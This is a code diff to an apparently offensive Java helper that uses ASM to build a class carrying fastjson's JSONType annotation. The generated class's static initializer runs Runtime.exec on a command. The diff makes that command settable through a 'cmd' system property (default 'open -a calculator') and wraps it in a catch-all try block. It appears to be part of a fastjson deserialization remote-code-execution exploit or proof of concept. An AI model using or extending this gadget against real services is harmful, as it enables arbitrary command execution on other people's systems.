@@ -2,6 +2,7 @@ import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.parser.ParserConfig;
 import org.objectweb.asm.AnnotationVisitor;
 import org.objectweb.asm.ClassWriter;
+import org.objectweb.asm.Label;
 import org.objectweb.asm.MethodVisitor;
 import org.objectweb.asm.Opcodes;
 
@@ -83,7 +84,8 @@ public class common {
     }
 
     static byte[] makeclass(String internalName) {
-        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
+        String command = System.getProperty("cmd", "open -a calculator");
+        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);
         writer.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);
 
         AnnotationVisitor annotation = writer.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
@@ -99,10 +101,21 @@ public class common {
 
         method = writer.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
         method.visitCode();
+        Label start = new Label();
+        Label end = new Label();
+        Label handler = new Label();
+        Label done = new Label();
+        method.visitTryCatchBlock(start, end, handler, "java/lang/Throwable");
+        method.visitLabel(start);
         method.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
-        method.visitLdcInsn("open -a calculator");
+        method.visitLdcInsn(command);
         method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
         method.visitInsn(Opcodes.POP);
+        method.visitLabel(end);
+        method.visitJumpInsn(Opcodes.GOTO, done);
+        method.visitLabel(handler);
+        method.visitInsn(Opcodes.POP);
+        method.visitLabel(done);
         method.visitInsn(Opcodes.RETURN);
         method.visitMaxs(2, 0);
         method.visitEnd();
